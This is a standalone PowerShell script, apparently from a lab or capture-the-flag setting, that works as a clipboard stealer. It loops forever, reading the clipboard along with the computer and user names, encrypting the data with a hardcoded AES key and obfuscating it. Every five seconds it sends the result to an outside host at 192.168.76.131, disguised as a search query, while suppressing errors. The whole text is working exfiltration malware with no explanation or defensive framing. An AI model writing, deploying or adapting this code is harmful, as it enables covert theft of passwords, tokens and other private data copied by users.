do {
    $clip = Get-Clipboard
    $date = Get-Date
    $out = "$date $env:computername $env:username $clip"
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
    $aes.Key = [System.Convert]::FromBase64String("c2RqYWhsZGtzYWprZGx3YQ==")
    $encryptor = $aes.CreateEncryptor()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($out)
    $encrypted = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    $out = [BitConverter]::ToString($encrypted) -replace '-'
    $out = $out.ToLower()
    $out = ($out -split "(.{15})" -ne "") -join ":"
    $out = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($out))
    $req = Invoke-WebRequest -Uri "http://192.168.76.131/search?q=$out" -AllowInsecureRedirect 2>$null
    Start-Sleep -Seconds 5
} while ($true)
